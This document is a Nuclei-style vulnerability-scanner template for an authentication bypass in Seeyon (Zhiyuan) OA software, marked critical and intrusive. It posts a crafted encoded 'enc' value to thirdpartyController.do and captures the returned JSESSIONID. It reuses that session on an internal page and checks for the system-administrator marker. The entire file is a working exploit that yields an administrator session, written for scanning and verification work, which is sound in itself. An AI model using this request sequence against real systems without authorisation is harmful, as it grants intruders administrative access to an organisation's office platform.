id: seeyon-cookie-leak

info:
  name: Seeyon Cookie Leak Login Bypass
  author: local
  severity: critical
  description: Uses the documented thirdpartyController flow and checks whether the returned session reaches an authenticated page.
  tags: seeyon,zhiyuan,authentication-bypass,active,intrusive

http:
  - raw:
      - |
        POST /seeyon/thirdpartyController.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
      - |
        GET /seeyon/main.do?method=headerjs HTTP/1.1
        Host: {{Hostname}}
        Cookie: JSESSIONID={{session}}

    extractors:
      - type: regex
        name: session
        part: header_1
        group: 1
        regex:
          - '(?i)JSESSIONID=([^;\\r\\n]+)'
        internal: true
    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_1 == 200'
          - 'status_code_2 == 200'
          - 'contains(body_2, "系统管理员")'
          - 'contains(body_2, "headerjs")'
        condition: and

